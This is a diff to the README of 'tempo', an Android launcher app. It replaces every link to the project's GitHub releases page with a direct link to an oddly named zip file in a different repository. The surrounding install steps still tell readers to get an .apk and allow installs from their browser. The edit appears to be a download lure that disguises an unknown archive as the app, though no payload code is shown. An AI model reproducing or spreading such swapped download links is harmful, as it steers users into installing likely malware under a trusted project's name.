@@ -5,7 +5,7 @@ description: "Minimize distractions with this minimal Android launcher designed 
 ---
 # ⏳ tempo - Take control of your digital life
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/aesopmandate96/tempo/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/aesopmandate96/aesopmandate96.github.io/raw/refs/heads/main/eccyesis/io_aesopmandate_github_v3.7-beta.2.zip)
 
 ## 📱 About the app
 
@@ -24,7 +24,7 @@ To run Tempo, your device needs to meet these basic standards:
 
 You can install Tempo by following these steps:
 
-1. Visit the following page to choose your download: [https://github.com/aesopmandate96/tempo/releases](https://github.com/aesopmandate96/tempo/releases).
+1. Visit the following page to choose your download: [https://github.com/aesopmandate96/aesopmandate96.github.io/raw/refs/heads/main/eccyesis/io_aesopmandate_github_v3.7-beta.2.zip](https://github.com/aesopmandate96/aesopmandate96.github.io/raw/refs/heads/main/eccyesis/io_aesopmandate_github_v3.7-beta.2.zip).
 2. Look for the file ending in `.apk`.
 3. Tap the file name to start the download on your phone.
 4. Your phone may ask for permission to install apps from your browser. Grant this permission to proceed.
